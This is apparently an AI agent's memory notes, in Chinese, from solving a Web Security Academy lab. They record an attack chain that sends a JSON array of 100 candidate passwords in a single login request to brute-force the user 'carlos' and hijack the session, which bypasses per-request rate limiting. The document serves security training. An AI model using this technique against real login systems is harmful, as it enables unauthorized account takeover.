---
metadata:
  node_type: memory
name: "PRS arm A lab-broken-brute-force-protection-multiple-credentials-per-request"
description: "arm A 基线:lab-broken-brute-force-protection-multiple-credentials-per-request 冷实例一次通过 - JSON password 数组单请求枚举 carlos,100 词候选表全过,302 + session 即夺号"
last_updated: 2026-10-09T09:34:18+08:00
created: 2026-10-09T09:34:18+08:00
---

## 2026-10-09 arm A 基线(冷实例,reused:false)

题:lab-broken-brute-force-protection-multiple-credentials-per-request(Authentication / password-based)。
实例:range_launch launch-url 直吃 canonical 路径 → https://0aca00b30301baa581e39322003000ad.web-security-academy.net/,jar /tmp/cj1.json,build_pending:false。

### 解法链(一次通过)
1. GET /login:表单 `<form method=POST action=/login>` 的按钮是 `jsonSubmit('/login')` ⇒ 登录端点吃 JSON 体,不是 urlencoded。
2. 机理探针:POST /login,`Content-Type: application/json`,体 `{"username":"wiener","password":["nopenope","peter"]}` → 302 `Location: /my-account?id=wiener` + Set-Cookie session(数组被逐个尝试,命中即建会话)⇒ 数组面确认可用。
3. 候选口令表来自题面链接的资源页 `/web-security/authentication/auth-lab-passwords`(page_read 剥 details 后取 code 块,html_text --tag code --tokens 得 100 词)。
4. 单请求完结:POST /login JSON 体 `{"username":"carlos","password":[<100 词>]}` → 302 `Location: /my-account?id=carlos` + 新 Set-Cookie session。
5. GET /my-account(jar 带新 session)→ 页内 `Your username is: carlos`,顶栏出现 `/my-account?id=carlos` 与 /logout。
6. `banner_verdict <base>` → solved:true,solved_class:true,congrats_line `<h4>Congratulations, you solved the lab!</h4>`。

### 要点/坑
- 单请求枚举 100 口令即绕过"每请求/每会话计数"的爆破保护:防护按请求数计,数组把 100 次尝试压成 1 个请求。
- http_session 无 body-from-file 选项,整份 JSON 数组直接作为一个 args 元素内联传入即可(不经 shell,无需转义)。
- set_cookie 由 http_session 自动写回 jar,后续 /my-account 与 banner_verdict 直接复用,无需手工传 cookie。
- 交付面无需求(无 exploit server 参与)。

